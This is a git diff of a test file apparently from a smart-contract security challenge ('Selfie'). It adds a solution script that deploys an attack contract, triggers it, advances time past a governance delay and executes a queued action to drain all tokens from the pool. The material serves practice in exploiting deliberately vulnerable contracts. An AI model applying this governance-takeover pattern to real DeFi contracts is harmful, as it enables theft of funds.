@@ -39,17 +39,22 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        this.attackContract = await (await ethers.getContractFactory("AttackSelfiePool", player)).deploy(
+            pool.address, governance.address, token.address
+        )
+
+        await this.attackContract.attack();
+        const ACTION_DELAY = 2 * 24 * 60 * 60 + 1;
+        await time.increase(ACTION_DELAY);
+
+        await governance.connect(player).executeAction(1);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
         // Player has taken all tokens from the pool
-        expect(
-            await token.balanceOf(player.address)
-        ).to.be.equal(TOKENS_IN_POOL);        
-        expect(
-            await token.balanceOf(pool.address)
-        ).to.be.equal(0);
+        expect(await token.balanceOf(player.address)).to.be.equal(TOKENS_IN_POOL);        
+        expect(await token.balanceOf(pool.address)).to.be.equal(0);
     });
 });
